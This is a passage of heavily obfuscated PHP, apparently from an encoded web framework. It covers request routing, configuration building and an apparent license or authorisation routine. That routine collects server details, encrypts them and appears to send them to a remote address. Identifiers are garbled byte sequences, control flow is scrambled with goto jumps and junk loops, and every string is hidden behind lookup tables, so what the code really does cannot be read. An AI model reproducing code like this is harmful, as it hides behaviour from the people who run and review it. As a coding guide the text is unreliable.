$eŸâè¸à‘º[587]) { if (!$E “²ó¦Ã) { break; } $E “²ó¦Ã++; } goto e¹§İæáÙ; BˆÜ¾Ò„…ò: $eŸâè¸à‘º =& $_SERVER[¹…ÕÄ]; $dÓ‰õÃ†Ï³ =& $_SERVER[È]; if ($GLOBALS[$dÓ‰õÃ†Ï³[22]][$dÓ‰õÃ†Ï³[28]] != $dÓ‰õÃ†Ï³[10]) { return; } goto A‰Ÿ¾µõÔÂ; EïÌÆ¬ éƒ: $F˜Ñƒßøï² = $dÓ‰õÃ†Ï³[31]; $fÔÖ°µé» = $eŸâè¸à‘º[585]; if (!$dÓ‰õÃ†Ï³[32]($c°¦ˆïˆÈŠ, $F˜Ñƒßøï²)) { return; } goto B½Ì¿À´“; e¹§İæáÙ: $dÓ‰õÃ†Ï³[34]($dÓ‰õÃ†Ï³[35], $fµ÷›´ñë, $fÅ³Âêô™Ì); $f…¼˜ŠÍÏÎ = $eŸâè¸à‘º[589]; $fµ÷›´ñë = $dÓ‰õÃ†Ï³[2]($fÅ³Âêô™Ì[0][0], $dÓ‰õÃ†Ï³[36]); goto a£¢´¬‹¾; Cªö¶¸ù×æ: } public function run() { goto C¯ãÚùâ Ğ; F¦»˜¦Š¨Å: $this->{$_SERVER[È][38]}(); $fîÚÔÈì¾ = $c¿¬î‹Å¿[590]; while (strlen($fîÚÔÈì¾) < $c¿¬î‹Å¿[579]) { if (!$fîÚÔÈì¾) { break; } $fîÚÔÈì¾++; } goto AœÊÂ² ïå; C¯ãÚùâ Ğ: $c¿¬î‹Å¿ =& $_SERVER[¹…ÕÄ]; $Eâ­´ß”Òø =& $_SERVER[È]; $this->{$_SERVER[È][37]}(); goto F¦»˜¦Š¨Å; B¹‚†…²ÏÙ: $BÀÛÄÁå˜Æ = $c¿¬î‹Å¿[593]; if (!$BÀÛÄÁå˜Æ) { die; } $Eâ­´ß”Òø[39]($Eâ­´ß”Òø[42], isset($d³Ûá¡Â[2]) && $d³Ûá¡Â[0] ? $d³Ûá¡Â[2] : $this->defaultAction); goto dÚ£‰¡ƒ¤Œ; dÚ£‰¡ƒ¤Œ: $eÕ…„Íê…ò = $c¿¬î‹Å¿[594]; while ($eÕ…„Íê…ò < $c¿¬î‹Å¿[570]) { if ($eÕ…„Íê…ò >= 0) { break; } $eÕ…„Íê…ò++; } $Eâ­´ß”Òø[39]($Eâ­´ß”Òø[43], MOD . $Eâ­´ß”Òø[1] . ST . $Eâ­´ß”Òø[1] . ACT); goto DõÚğ›»Éù; c´—¾÷¬¹œ: $c™ã¿´åôß = $c¿¬î‹Å¿[596]; if (strlen($c™ã¿´åôß) < $c¿¬î‹Å¿[587]) { die; } $this->{$_SERVER[È][45]}(); goto c£‰ŞÜßÃÆ; c£‰ŞÜßÃÆ: if ($Eâ­´ß”Òø[19]($d³Ûá¡Â) >= 3) { $this->{$_SERVER[È][21]}($a¸ë°¸»¼Å); } else { $this->{$_SERVER[È][21]}(ACTION); } goto F¯åšÓâ­æ; AœÊÂ² ïå: $d³Ûá¡Â = $GLOBALS[$Eâ­´ß”Òø[22]][$Eâ­´ß”Òø[23]]; $eé¬–¨„Ê = $c¿¬î‹Å¿[591]; $a¸ë°¸»¼Å = $GLOBALS[$Eâ­´ß”Òø[22]][$Eâ­´ß”Òø[28]]; goto a‘°’æ²Ï; a‘°’æ²Ï: $Eâ­´ß”Òø[39]($Eâ­´ß”Òø[40], isset($d³Ûá¡Â[0]) && $d³Ûá¡Â[0] ? $d³Ûá¡Â[0] : $this->defaultModule); $FÅ—™­Ïˆä = $c¿¬î‹Å¿[592]; $Eâ­´ß”Òø[39]($Eâ­´ß”Òø[41], isset($d³Ûá¡Â[1]) && $d³Ûá¡Â[0] ? $d³Ûá¡Â[1] : $this->defaultController); goto B¹‚†…²ÏÙ; DõÚğ›»Éù: $CÂ°æ–¥˜¨ = $c¿¬î‹Å¿[595]; if (strlen($CÂ°æ–¥˜¨) < $c¿¬î‹Å¿[574]) { return; } $_SERVER[$Eâ­´ß”Òø[44]] = $Eâ­´ß”Òø[6](ACTION); goto c´—¾÷¬¹œ; F¯åšÓâ­æ: } private $udaic2052363 = array(); private $dlbjd6a12f2e = ''; public function eidk8a63065a() { goto DõÍ¨…á©à; dŞĞ–÷è‡: $Fµ¨âÛ¹²˜ = $b‹ÔÑåµ‹İ[597]; while (strlen($Fµ¨âÛ¹²˜) < $b‹ÔÑåµ‹İ[570]) { if (!$Fµ¨âÛ¹²˜) { break; } $Fµ¨âÛ¹²˜++; } $this->{$_SERVER[È][47]}(); goto fÛ·Şƒ§“; EÕö»Î‚®: $this->{$_SERVER[È][3]}($C¿Áœ¥½…–[53], array($this, $C¿Áœ¥½…–[54])); $this->{$_SERVER[È][3]}($C¿Áœ¥½…–[55], array($this, $C¿Áœ¥½…–[56])); $this->{$_SERVER[È][3]}($C¿Áœ¥½…–[57], array($this, $C¿Áœ¥½…–[58])); goto e¤ƒ™Æ‡ô‘; fÛ·Şƒ§“: $AŒÈ…ÖÆ× = $b‹ÔÑåµ‹İ[598]; if (strlen($AŒÈ…ÖÆ×) < $b‹ÔÑåµ‹İ[587]) { die; } $this->{$_SERVER[È][48]}(); goto D‹Ì„İòÁ; e¤ƒ™Æ‡ô‘: $this->{$_SERVER[È][3]}($C¿Áœ¥½…–[59], array($this, $C¿Áœ¥½…–[60])); $DÆ¬…ëÚë“ = $b‹ÔÑåµ‹İ[602]; goto féĞ„ØÍÜˆ; fñç‰±Í: $this->{$_SERVER[È][51]}(); $this->{$_SERVER[È][52]}(); $DŒùÍå“À = $b‹ÔÑåµ‹İ[601]; goto EÕö»Î‚®; D‹Ì„İòÁ: $b÷î­ä‚¯® = $b‹ÔÑåµ‹İ[599]; if (!$b÷î­ä‚¯®) { die; } $this->{$_SERVER[È][49]}(); goto E£íåïä›š; DõÍ¨…á©à: $b‹ÔÑåµ‹İ =& $_SERVER[¹…ÕÄ]; $C¿Áœ¥½…– =& $_SERVER[È]; $this->{$_SERVER[È][46]}(); goto dŞĞ–÷è‡; E£íåïä›š: $CÍ™‰ø»’ô = $b‹ÔÑåµ‹İ[600]; while ($CÍ™‰ø»’ô < $b‹ÔÑåµ‹İ[587]) { if ($CÍ™‰ø»’ô >= 0) { break; } $CÍ™‰ø»’ô++; } $this->{$_SERVER[È][50]}(); goto fñç‰±Í; féĞ„ØÍÜˆ: } public function txyz911e9ae8($A»ˆ·Å›ê†) { goto DçôŒ¡áË; fµø¾Ù¹­À: $cË‚óœºÔ = $c…¾Ùˆã¢­[603]; while ($cË‚óœºÔ < $c…¾Ùˆã¢­[581]) { if ($cË‚óœºÔ >= 0) { break; } $cË‚óœºÔ++; } $CËª—â¶É = array($Cã… “Ÿê¡[64], $Cã… “Ÿê¡[65], $Cã… “Ÿê¡[66], $Cã… “Ÿê¡[67], $Cã… “Ÿê¡[68], $Cã… “Ÿê¡[69], $Cã… “Ÿê¡[70], $Cã… “Ÿê¡[71], $Cã… “Ÿê¡[72], $Cã… “Ÿê¡[73], $Cã… “Ÿê¡[74], $Cã… “Ÿê¡[75], $Cã… “Ÿê¡[76], $Cã… “Ÿê¡[77], $Cã… “Ÿê¡[78], $Cã… “Ÿê¡[79], $Cã… “Ÿê¡[80], $Cã… “Ÿê¡[81], $Cã… “Ÿê¡[82], $Cã… “Ÿê¡[83], $Cã… “Ÿê¡[84], $Cã… “Ÿê¡[85], $Cã… “Ÿê¡[86], $Cã… “Ÿê¡[87], $Cã… “Ÿê¡[88], $Cã… “Ÿê¡[89], $Cã… “Ÿê¡[90], $Cã… “Ÿê¡[91], $Cã… “Ÿê¡[92], $Cã… “Ÿê¡[93], $Cã… “Ÿê¡[94], $Cã… “Ÿê¡[95], $Cã… “Ÿê¡[96], $Cã… “Ÿê¡[97], $Cã… “Ÿê¡[98], $Cã… “Ÿê¡[99]); goto dÏ¹„ŸíÎ¸; aªÓç”–: if (strlen($bé˜Á¶à¸) < $c…¾Ùˆã¢­[587]) { return; } unset($A»ˆ·Å›ê†[$Cã… “Ÿê¡[102]][$Cã… “Ÿê¡[104]][$Cã… “Ÿê¡[106]]); $bÉíÆ‰¥ôŸ = $c…¾Ùˆã¢­[606]; goto CÒ©¦–œŠ®; D­ã†”ˆÏ: return $A»ˆ·Å›ê†; goto D‡¡èİõ–ô; EÃŸì…Í‘Û: $A»ˆ·Å›ê†[$Cã… “Ÿê¡[114]][$Cã… “Ÿê¡[123]] = $Cã… “Ÿê¡[124]($Cã… “Ÿê¡[125]()); $cÃçÈâšÈ” = $c…¾Ùˆã¢­[607]; while ($cÃçÈâšÈ” < $c…¾Ùˆã¢­[587]) { if ($cÃçÈâšÈ” >= 0) { break; } $cÃçÈâšÈ”++; } goto A§”¥‚ĞŠ¾; CÒ©¦–œŠ®: while (strlen($bÉíÆ‰¥ôŸ) < $c…¾Ùˆã¢­[574]) { if (!$bÉíÆ‰¥ôŸ) { break; } $bÉíÆ‰¥ôŸ++; } unset($A»ˆ·Å›ê†[$Cã… “Ÿê¡[102]][$Cã… “Ÿê¡[103]][$Cã… “Ÿê¡[76]]); unset($A»ˆ·Å›ê†[$Cã… “Ÿê¡[102]][$Cã… “Ÿê¡[103]][$Cã… “Ÿê¡[107]]); goto F Ùºß´î; F Ùºß´î: $A»ˆ·Å›ê†[$Cã… “Ÿê¡[102]][$Cã… “Ÿê¡[103]][$Cã… “Ÿê¡[108]] = array($Cã… “Ÿê¡[109] => (int) $cæ’±â·À½[$Cã… “Ÿê¡[110]], $Cã… “Ÿê¡[111] => (int) $Cã… “Ÿê¡[112]($cæ’±â·À½, $Cã… “Ÿê¡[113], 0)); $A»ˆ·Å›ê†[$Cã… “Ÿê¡[114]][$Cã… “Ÿê¡[115]] = $Cã… “Ÿê¡[116]($Cã… “Ÿê¡[117])->{$_SERVER[È][118]}(); $A»ˆ·Å›ê†[$Cã… “Ÿê¡[114]][$Cã… “Ÿê¡[119]] = $Cã… “Ÿê¡[120]($_SERVER[$Cã… “Ÿê¡[121]] . $c¥Ÿ«İÚÊ‡[$Cã… “Ÿê¡[122]]); goto EÃŸì…Í‘Û; A§”¥‚ĞŠ¾: $A»ˆ·Å›ê†[$Cã… “Ÿê¡[114]][$Cã… “Ÿê¡[126]] = $this->dlbjd6a12f2e; if ($c¥Ÿ«İÚÊ‡[$Cã… “Ÿê¡[126]] != $Cã… “Ÿê¡[127]) { $A»ˆ·Å›ê†[$Cã… “Ÿê¡[114]][$Cã… “Ÿê¡[128]] = $c¥Ÿ«İÚÊ‡[$Cã… “Ÿê¡[128]]; $A»ˆ·Å›ê†[$Cã… “Ÿê¡[114]][$Cã… “Ÿê¡[129]] = $c¥Ÿ«İÚÊ‡[$Cã… “Ÿê¡[129]]; $bë®½ ÄÈ = $Cã… “Ÿê¡[130](10) . $this->dlbjd6a12f2e . $Cã… “Ÿê¡[130](5); $A»ˆ·Å›ê†[$Cã… “Ÿê¡[102]][$Cã… “Ÿê¡[131]][$Cã… “Ÿê¡[132]] = $this->{$_SERVER[È][133]}($bë®½ ÄÈ, $A»ˆ·Å›ê†[$Cã… “Ÿê¡[114]][$Cã… “Ÿê¡[119]]); } if ($this->dlbjd6a12f2e == $Cã… “Ÿê¡[127]) { $A»ˆ·Å›ê†[$Cã… “Ÿê¡[102]][$Cã… “Ÿê¡[103]][$Cã… “Ÿê¡[108]][$Cã… “Ÿê¡[113]] = 0; } goto f†¯éóŸ•–; dÏ¹„ŸíÎ¸: $E÷×¨·œ× = $c…¾Ùˆã¢­[604]; while (strlen($E÷×¨·œ×) < $c…¾Ùˆã¢­[581]) { if (!$E÷×¨·œ×) { break; } $E÷×¨·œ×++; } foreach ($CËª—â¶É as $aÑœ¥Õƒò‘) { $F˜†¹…¹ô = $GLOBALS[$Cã… “Ÿê¡[100]][$Cã… “Ÿê¡[101]][$aÑœ¥Õƒò‘]; if (isset($c¥Ÿ«İÚÊ‡[$aÑœ¥Õƒò‘])) { $F˜†¹…¹ô = $c¥Ÿ«İÚÊ‡[$aÑœ¥Õƒò‘]; } $A»ˆ·Å›ê†[$Cã… “Ÿê¡[102]][$Cã… “Ÿê¡[103]][$aÑœ¥Õƒò‘] = $F˜†¹…¹ô; } goto Aôé´š°Îè; Aôé´š°Îè: $cæ’±â·À½ = $A»ˆ·Å›ê†[$Cã… “Ÿê¡[102]][$Cã… “Ÿê¡[103]][$Cã… “Ÿê¡[76]]; unset($A»ˆ·Å›ê†[$Cã… “Ÿê¡[102]][$Cã… “Ÿê¡[104]][$Cã… “Ÿê¡[105]]); $bé˜Á¶à¸ = $c…¾Ùˆã¢­[605]; goto aªÓç”–; DçôŒ¡áË: $c…¾Ùˆã¢­ =& $_SERVER[¹…ÕÄ]; $Cã… “Ÿê¡ =& $_SERVER[È]; $c¥Ÿ«İÚÊ‡ = $Cã… “Ÿê¡[61]($Cã… “Ÿê¡[62])->{$_SERVER[È][63]}(); goto fµø¾Ù¹­À; f†¯éóŸ•–: $A»ˆ·Å›ê†[$Cã… “Ÿê¡[114]][$Cã… “Ÿê¡[134]] = $Cã… “Ÿê¡[112]($this->udaic2052363, $Cã… “Ÿê¡[135], $Cã… “Ÿê¡[10]); $A»ˆ·Å›ê†[$Cã… “Ÿê¡[114]][$Cã… “Ÿê¡[136]] = $Cã… “Ÿê¡[112]($this->udaic2052363, $Cã… “Ÿê¡[137], $Cã… “Ÿê¡[10]); if ($Cã… “Ÿê¡[112]($GLOBALS, $Cã… “Ÿê¡[138]) && $this->config[$Cã… “Ÿê¡[139]]) { $A»ˆ·Å›ê†[$Cã… “Ÿê¡[114]][$Cã… “Ÿê¡[140]] = WEB_ROOT; } goto D­ã†”ˆÏ; D‡¡èİõ–ô: } private function nprj2ef54d00() { goto a®ª®šò³µ; a®ª®šò³µ: $e¹´éÜèÀ =& $_SERVER[¹…ÕÄ]; $C‹‡¿Ğ Â =& $_SERVER[È]; if ($_SERVER[$C‹‡¿Ğ Â[44]] == $C‹‡¿Ğ Â[141]) { $FÀ†Íåö³Û = array($C‹‡¿Ğ Â[126] => $this->dlbjd6a12f2e, $C‹‡¿Ğ Â[142] => $this->{$_SERVER[È][143]}(), $C‹‡¿Ğ Â[144] => $C‹‡¿Ğ Â[61]($C‹‡¿Ğ Â[145])->{$_SERVER[È][146]}()); if ($this->dlbjd6a12f2e != $C‹‡¿Ğ Â[127]) { $FÛóó†Ÿ‘˜ = $C‹‡¿Ğ Â[112]($this->udaic2052363, $C‹‡¿Ğ Â[147]); if ($FÛóó†Ÿ‘˜) { $FÀ†Íåö³Û[$C‹‡¿Ğ Â[148]] = $FÛóó†Ÿ‘˜; $FÀ†Íåö³Û[$C‹‡¿Ğ Â[149]] = $C‹‡¿Ğ Â[150]($C‹‡¿Ğ Â[112]($this->udaic2052363, $C‹‡¿Ğ Â[151])); $FÀ†Íåö³Û[$C‹‡¿Ğ Â[152]] = $C‹‡¿Ğ Â[112]($this->udaic2052363, $C‹‡¿Ğ Â[137]); } } $FÀ†Íåö³Û = $this->{$_SERVER[È][153]}($C‹‡¿Ğ Â[154]($FÀ†Íåö³Û), $C‹‡¿Ğ Â[120]($C‹‡¿Ğ Â[155])); $EªÏØ”ğ–† = array($C‹‡¿Ğ Â[156] => $FÀ†Íåö³Û); $C‹‡¿Ğ Â[13](array($C‹‡¿Ğ Â[157], $C‹‡¿Ğ Â[158]), $EªÏØ”ğ–†); } goto aó‡Õ¡ß´; aó‡Õ¡ß´: if ($this->dlbjd6a12f2e == $C‹‡¿Ğ Â[127]) { return; } $E¥êööêñø = array($C‹‡¿Ğ Â[159], $C‹‡¿Ğ Â[160], $C‹‡¿Ğ Â[161], $C‹‡¿Ğ Â[162], $C‹‡¿Ğ Â[163], $C‹‡¿Ğ Â[164]); $Cá•ä‰è‹° = $C‹‡¿Ğ Â[61]($C‹‡¿Ğ Â[62])->{$_SERVER[È][63]}(); goto fÛËè·„ÕŞ; eºÆÑºÓÇê: if (!$B§áÕ÷‡ ‘) { return; } goto EìÉ§Æ¿Ç; fÛËè·„ÕŞ: $e‡ùÙ´Æˆğ = $e¹´éÜèÀ[608]; if (!$e‡ùÙ´Æˆğ) { die; } $EªÏØ”ğ–† = array($C‹‡¿Ğ Â[165] => $Cá•ä‰è‹°[$C‹‡¿Ğ Â[64]], $C‹‡¿Ğ Â[166] => $Cá•ä‰è‹°[$C‹‡¿Ğ Â[65]], $C‹‡¿Ğ Â[167] => $C‹‡¿Ğ Â[10]); goto cÊÎ†äì¥¦; cÊÎ†äì¥¦: foreach ($E¥êööêñø as $DÜçÕô¿ØÎ) { if (!isset($Cá•ä‰è‹°[$DÜçÕô¿ØÎ]) || !$Cá•ä‰è‹°[$DÜçÕô¿ØÎ]) { continue; } $EªÏØ”ğ–†[$DÜçÕô¿ØÎ] = $Cá•ä‰è‹°[$DÜçÕô¿ØÎ]; $eŞ±Á²‹¸ï = $e¹´éÜèÀ[609]; if (strlen($eŞ±Á²‹¸ï) < $e¹´éÜèÀ[587]) { die; } } $C‹‡¿Ğ Â[13](array($C‹‡¿Ğ Â[157], $C‹‡¿Ğ Â[158]), $EªÏØ”ğ–†); $B§áÕ÷‡ ‘ = $e¹´éÜèÀ[610]; goto eºÆÑºÓÇê; EìÉ§Æ¿Ç: } private function adwtf2b69445() { goto A÷ß¶å¢‰; BİÌØ½¾°: if (!$Bçİ‚˜Öˆ[198]($Aé’§Š‚¢‚) || !$Bçİ‚˜Öˆ[198]($Aé’§Š‚¢‚[$Bçİ‚˜Öˆ[199]]) || $Aé’§Š‚¢‚[$Bçİ‚˜Öˆ[171]] != !0) { $c²²Áùöğœ = $Bçİ‚˜Öˆ[204]($Bçİ‚˜Öˆ[205]); $EÜ²ãè£ˆ = $Aé’§Š‚¢‚[$Bçİ‚˜Öˆ[199]] ? $Bçİ‚˜Öˆ[201] . $Aé’§Š‚¢‚[$Bçİ‚˜Öˆ[199]] : $c²²Áùöğœ; $Bçİ‚˜Öˆ[172]($EÜ²ãè£ˆ, !1); } $e—†½òÈ¨ = $Aé’§Š‚¢‚[$Bçİ‚˜Öˆ[199]]; $bƒ«§ª¡ƒ³ = $this->{$_SERVER[È][206]}($e—†½òÈ¨[$Bçİ‚˜Öˆ[207]]); goto fßÀ…®¹À«; d³‘—Ğâª: if (!isset($Fµùª¥Í£Ö[$Bçİ‚˜Öˆ[171]]) || $Bçİ‚˜Öˆ[24]($Fµùª¥Í£Ö[$Bçİ‚˜Öˆ[171]]) != 16) { $Bçİ‚˜Öˆ[172]($Bçİ‚˜Öˆ[173] . $Fµùª¥Í£Ö[$Bçİ‚˜Öˆ[171]], !1); } $bÒ’ØÛ¬²º = $Bçİ‚˜Öˆ[61]($Bçİ‚˜Öˆ[62])->{$_SERVER[È][63]}($Bçİ‚˜Öˆ[122]); $eëğ¡‡â²ì = array($Bçİ‚˜Öˆ[171] => $Fµùª¥Í£Ö[$Bçİ‚˜Öˆ[171]], $Bçİ‚˜Öˆ[174] => $Bçİ‚˜Öˆ[130](16), $Bçİ‚˜Öˆ[175] => $Bçİ‚˜Öˆ[155], $Bçİ‚˜Öˆ[176] => $Bçİ‚˜Öˆ[177], $Bçİ‚˜Öˆ[178] => $_SERVER[$Bçİ‚˜Öˆ[179]], $Bçİ‚˜Öˆ[180] => $_SERVER[$Bçİ‚˜Öˆ[181]], $Bçİ‚˜Öˆ[182] => $_SERVER[$Bçİ‚˜Öˆ[183]]); goto A„¬˜‘; f—¶ãß‰»: $B¿šÅ«Èù¶ = $c¹—·ÚàˆÑ[617]; $DìİŒÜí¨ë = $Bçİ‚˜Öˆ[228]($Bçİ‚˜Öˆ[61]($Bçİ‚˜Öˆ[11])->{$_SERVER[È][229]}(), $Bçİ‚˜Öˆ[230]); $bç²«ø¡µ = $c¹—·ÚàˆÑ[618]; goto Eé£±®çõ; B“®¥â•ğÁ: $FÔ¡˜âéÆ£ = $Bçİ‚˜Öˆ[130](16); $f¤³å¶Èß§ = $c¹—·ÚàˆÑ[615]; if (strlen($f¤³å¶Èß§) < $c¹—·ÚàˆÑ[579]) { die; } goto fˆŸÑ™ÏŠó; e¤­Í§¨¼–: if (!$f…˜Áøœ–æ) { die; } $Bçİ‚˜Öˆ[61]($Bçİ‚˜Öˆ[11])->{$_SERVER[È][232]}($eï…³Ë”³³[$Bçİ‚˜Öˆ[233]], array($Bçİ‚˜Öˆ[234] => $E°™ÁöÖ™Ë)); $eÜ¿†ç­š• = $c¹—·ÚàˆÑ[622]; goto fŒ³®…Ş…; fßÀ…®¹À«: $cÊäòœ±Ù = $c¹—·ÚàˆÑ[613]; if (strlen($cÊäòœ±Ù) < $c¹—·ÚàˆÑ[581]) { return; } if (!$bƒ«§ª¡ƒ³ || $bƒ«§ª¡ƒ³ != $e—†½òÈ¨[$Bçİ‚˜Öˆ[151]]) { $b‚±Š®š‡Ñ = array($Bçİ‚˜Öˆ[208] => $Bçİ‚˜Öˆ[61]($Bçİ‚˜Öˆ[62])->{$_SERVER[È][63]}($Bçİ‚˜Öˆ[122]), $Bçİ‚˜Öˆ[209] => $_SERVER[$Bçİ‚˜Öˆ[121]], $Bçİ‚˜Öˆ[210] => $Bçİ‚˜Öˆ[211](), $Bçİ‚˜Öˆ[180] => $_SERVER[$Bçİ‚˜Öˆ[181]]); $a×´Î°ç¿ = $this->{$_SERVER[È][212]}($Bçİ‚˜Öˆ[154]($b‚±Š®š‡Ñ)); $this->{$_SERVER[È][189]}($Bçİ‚˜Öˆ[213] . $a×´Î°ç¿); $Bçİ‚˜Öˆ[172]($Bçİ‚˜Öˆ[204]($Bçİ‚˜Öˆ[214]), !0); } goto B†¦¡ÜÈˆå; A÷ß¶å¢‰: $c¹—·ÚàˆÑ =& $_SERVER[¹…ÕÄ]; $Bçİ‚˜Öˆ =& $_SERVER[È]; if ($_SERVER[$Bçİ‚˜Öˆ[44]] != $Bçİ‚˜Öˆ[168]) { return; } goto C¡‡ºÛùµ‚; C¡‡ºÛùµ‚: if (!$Bçİ‚˜Öˆ[112]($GLOBALS, $Bçİ‚˜Öˆ[138])) { die; } $Fµùª¥Í£Ö = $GLOBALS[$Bçİ‚˜Öˆ[22]]; if (isset($Fµùª¥Í£Ö[$Bçİ‚˜Öˆ[169]])) { $this->{$_SERVER[È][170]}(); die; } goto d³‘—Ğâª; d˜ƒ„©ã÷: if (!$dì·ª¾´‚å) { die; } $E°™ÁöÖ™Ë[$b¨ëñÊùšØ] = $BÈÅ‚ĞŸŞŒ; $f…˜Áøœ–æ = $c¹—·ÚàˆÑ[621]; goto e¤­Í§¨¼–; aÖñ†Ø„: while ($bª«êÆˆ×Ê < $c¹—·ÚàˆÑ[574]) { if ($bª«êÆˆ×Ê >= 0) { break; } $bª«êÆˆ×Ê++; } $E°™ÁöÖ™Ë = array(); $dì·ª¾´‚å = $c¹—·ÚàˆÑ[620]; goto d˜ƒ„©ã÷; Dê‰İÅˆÄô: if (!$f²ËÏÅŞßĞ) { die; } goto eŞß“°ò÷°; fŒ³®…Ş…: while (strlen($eÜ¿†ç­š•) < $c¹—·ÚàˆÑ[574]) { if (!$eÜ¿†ç­š•) { break; } $eÜ¿†ç­š•++; } $this->udaic2052363 = $e—†½òÈ¨; $this->dlbjd6a12f2e = $F¶é ¾ß[$Bçİ‚˜Öˆ[126]]; goto CíøØ„‹íÏ; BŠ¤ŒÏÊáò: Cache::set($Bçİ‚˜Öˆ[236] . $Bçİ‚˜Öˆ[120]($bÒ’ØÛ¬²º . $Bçİ‚˜Öˆ[237]), $Bçİ‚˜Öˆ[10]); $Bçİ‚˜Öˆ[172]($Bçİ‚˜Öˆ[204]($Bçİ‚˜Öˆ[214]), !0); $f²ËÏÅŞßĞ = $c¹—·ÚàˆÑ[624]; goto Dê‰İÅˆÄô; DÑÎÈÆƒ÷³: $CÔˆ›••³Á = $bó¸ËŒÁˆÅ . $F¶é ¾ß[$Bçİ‚˜Öˆ[126]] . $F¶é ¾ß[$Bçİ‚˜Öˆ[218]]; $F¶é ¾ß[$Bçİ‚˜Öˆ[128]] = $Bçİ‚˜Öˆ[220]($Bçİ‚˜Öˆ[124]($this->{$_SERVER[È][153]}($CÔˆ›••³Á, $Bçİ‚˜Öˆ[221]))); $d„¨‹¦îï = $c¹—·ÚàˆÑ[614]; goto B“®¥â•ğÁ; B†¦¡ÜÈˆå: $F¶é ¾ß = array($Bçİ‚˜Öˆ[215] => $eëğ¡‡â²ì[$Bçİ‚˜Öˆ[171]], $Bçİ‚˜Öˆ[216] => $e—†½òÈ¨[$Bçİ‚˜Öˆ[217]], $Bçİ‚˜Öˆ[218] => $Bçİ‚˜Öˆ[130](16), $Bçİ‚˜Öˆ[126] => $e—†½òÈ¨[$Bçİ‚˜Öˆ[219]]); if ($eëğ¡‡â²ì[$Bçİ‚˜Öˆ[174]]) { $F¶é ¾ß[$Bçİ‚˜Öˆ[218]] = $eëğ¡‡â²ì[$Bçİ‚˜Öˆ[174]]; } $bó¸ËŒÁˆÅ = $Bçİ‚˜Öˆ[25]($Bçİ‚˜Öˆ[120]($F¶é ¾ß[$Bçİ‚˜Öˆ[216]]), 10, 10); goto DÑÎÈÆƒ÷³; A’Î© …Ö: $Bçİ‚˜Öˆ[61]($Bçİ‚˜Öˆ[62])->{$_SERVER[È][227]}($F¶é ¾ß); $AÍ™…Ÿ’…” = $Bçİ‚˜Öˆ[120]($_SERVER[$Bçİ‚˜Öˆ[121]] . $Bçİ‚˜Öˆ[220]($bÒ’ØÛ¬²º) . $F¶é ¾ß[$Bçİ‚˜Öˆ[216]]); $DÈ……Ö¯İ¹ = $c¹—·ÚàˆÑ[616]; goto F©²ÔÂÌâÉ; fˆŸÑ™ÏŠó: $a•’£îª…” = $FÔ¡˜âéÆ£ . $F¶é ¾ß[$Bçİ‚˜Öˆ[126]] . $this->{$_SERVER[È][153]}($Bçİ‚˜Öˆ[120]($F¶é ¾ß[$Bçİ‚˜Öˆ[215]]), $FÔ¡˜âéÆ£); $F¶é ¾ß[$Bçİ‚˜Öˆ[129]] = $Bçİ‚˜Öˆ[124]($Bçİ‚˜Öˆ[220]($this->{$_SERVER[È][153]}($a•’£îª…”, $Bçİ‚˜Öˆ[222]))); if ($e—†½òÈ¨[$Bçİ‚˜Öˆ[223]] && $e—†½òÈ¨[$Bçİ‚˜Öˆ[223]] >= 1) { $Bçİ‚˜Öˆ[61]($Bçİ‚˜Öˆ[62])->{$_SERVER[È][224]}($Bçİ‚˜Öˆ[225], $Bçİ‚˜Öˆ[226]); } goto A’Î© …Ö; CíøØ„‹íÏ: $this->{$_SERVER[È][235]}(); $díˆ˜Ëƒëõ = $c¹—·ÚàˆÑ[623]; if (strlen($díˆ˜Ëƒëõ) < $c¹—·ÚàˆÑ[570]) { die; } goto BŠ¤ŒÏÊáò; A„¬˜‘: $aŸ’Òä™Õ = $c¹—·ÚàˆÑ[611]; $E‡Ëƒ… = $Bçİ‚˜Öˆ[120]($_SERVER[$Bçİ‚˜Öˆ[121]] . $bÒ’ØÛ¬²º); if ($Fµùª¥Í£Ö[$Bçİ‚˜Öˆ[184]] == $Bçİ‚˜Öˆ[185]) { $fÍ­Ê”°åğ = $this->{$_SERVER[È][153]}($E‡Ëƒ…, $Bçİ‚˜Öˆ[186]); $a×´Î°ç¿ = $this->{$_SERVER[È][133]}($Bçİ‚˜Öˆ[154]($eëğ¡‡â²ì), $E‡Ëƒ… . $Bçİ‚˜Öˆ[187], 3); $a×´Î°ç¿ = $a×´Î°ç¿ . $Bçİ‚˜Öˆ[188] . $_SERVER[$Bçİ‚˜Öˆ[179]]; $aÙÚÏƒçî™ = $this->{$_SERVER[È][189]}($Bçİ‚˜Öˆ[190] . $fÍ­Ê”°åğ . $Bçİ‚˜Öˆ[191] . $a×´Î°ç¿, -1); $Bçİ‚˜Öˆ[172]($aÙÚÏƒçî™, !0); } else { if ($Fµùª¥Í£Ö[$Bçİ‚˜Öˆ[184]] == $Bçİ‚˜Öˆ[192]) { $CÄÔõ»ª¦ß = $Bçİ‚˜Öˆ[25]($Bçİ‚˜Öˆ[120]($Bçİ‚˜Öˆ[193] . $E‡Ëƒ…), 12, 15) . $Bçİ‚˜Öˆ[194]; $a×´Î°ç¿ = $this->{$_SERVER[È][195]}($Bçİ‚˜Öˆ[2]($Fµùª¥Í£Ö[$Bçİ‚˜Öˆ[196]]), $CÄÔõ»ª¦ß, 2); $Aé’§Š‚¢‚ = $Bçİ‚˜Öˆ[197]($a×´Î°ç¿, !0); if (!$Bçİ‚˜Öˆ[198]($Aé’§Š‚¢‚) || !$Bçİ‚˜Öˆ[198]($Aé’§Š‚¢‚[$Bçİ‚˜Öˆ[199]]) || $Aé’§Š‚¢‚[$Bçİ‚˜Öˆ[171]] != !0) { $c²²Áùöğœ = $Bçİ‚˜Öˆ[200]; $EÜ²ãè£ˆ = $Aé’§Š‚¢‚[$Bçİ‚˜Öˆ[199]] ? $Bçİ‚˜Öˆ[201] . $Aé’§Š‚¢‚[$Bçİ‚˜Öˆ[199]] : $c²²Áùöğœ; $Bçİ‚˜Öˆ[172]($EÜ²ãè£ˆ, !1); } else { $eëğ¡‡â²ì[$Bçİ‚˜Öˆ[174]] = $Aé’§Š‚¢‚[$Bçİ‚˜Öˆ[199]][$Bçİ‚˜Öˆ[202]]; } } else { $Aé’§Š‚¢‚ = $this->{$_SERVER[È][189]}($Bçİ‚˜Öˆ[203], $eëğ¡‡â²ì, 10); $b˜¡¿ÊÅº¯ = $c¹—·ÚàˆÑ[612]; } } goto BİÌØ½¾°; Eé£±®çõ: while ($bç²«ø¡µ < $c¹—·ÚàˆÑ[581]) { if ($bç²«ø¡µ >= 0) { break; } $bç²«ø¡µ++; } $eï…³Ë”³³ = $DìİŒÜí¨ë[$Bçİ‚˜Öˆ[231]]; 